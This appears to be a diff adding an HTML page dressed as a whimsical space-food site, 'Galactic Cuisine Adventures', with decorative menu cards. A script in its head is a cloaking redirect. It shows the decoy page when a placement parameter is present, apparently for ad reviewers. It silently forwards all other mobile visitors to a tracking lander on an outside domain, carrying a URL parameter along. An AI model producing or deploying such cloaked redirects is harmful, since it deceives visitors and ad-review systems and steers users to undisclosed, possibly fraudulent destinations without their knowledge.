@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Cuisine Adventures</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #1a1a2e;
+            color: #e94560;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: #0f3460;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #16213e;
+        }
+        .card {
+            background-color: #16213e;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+        footer {
+            background-color: #0f3460;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #e94560;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Galactic Cuisine Adventures</h1>
+    </header>
+    <div class="container">
+        <div class="card">
+            <h2>Martian Munchies</h2>
+            <p>Taste the red planet's finest delicacies!</p>
+        </div>
+        <div class="card">
+            <h2>Nebula Noodles</h2>
+            <p>Slurp up the cosmos in every bite!</p>
+        </div>
+        <div class="card">
+            <h2>Asteroid Appetizers</h2>
+            <p>Crunchy space rocks to start your meal!</p>
+        </div>
+        <div class="card">
+            <h2>Lunar Lemonade</h2>
+            <p>Refreshing drinks straight from the moon!</p>
+        </div>
+        <div class="card">
+            <h2>Supernova Sushi</h2>
+            <p>Explosive flavors rolled into every piece!</p>
+        </div>
+        <div class="card">
+            <h2>Gravity-Free Gnocchi</h2>
+            <p>Pasta that floats right to your mouth!</p>
+        </div>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
